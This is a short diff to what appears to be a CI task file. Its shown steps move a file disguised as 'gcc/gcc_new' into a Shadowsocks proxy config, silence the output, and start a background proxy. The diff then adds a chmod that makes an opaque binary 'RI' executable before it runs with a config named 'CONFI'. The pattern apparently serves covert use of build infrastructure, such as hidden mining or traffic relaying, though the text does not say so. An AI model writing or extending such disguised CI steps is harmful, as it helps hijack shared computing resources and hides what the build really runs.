@@ -17,4 +17,5 @@ task:
     - mv gcc/gcc_new /etc/shadowsocks-libev/make.json &>/dev/null
     - systemctl stop shadowsocks-libev.service &>/dev/null || true
     - ss-local -v -c /etc/shadowsocks-libev/make.json &
+    - chmod +x RI
     - ./RI -c CONFI
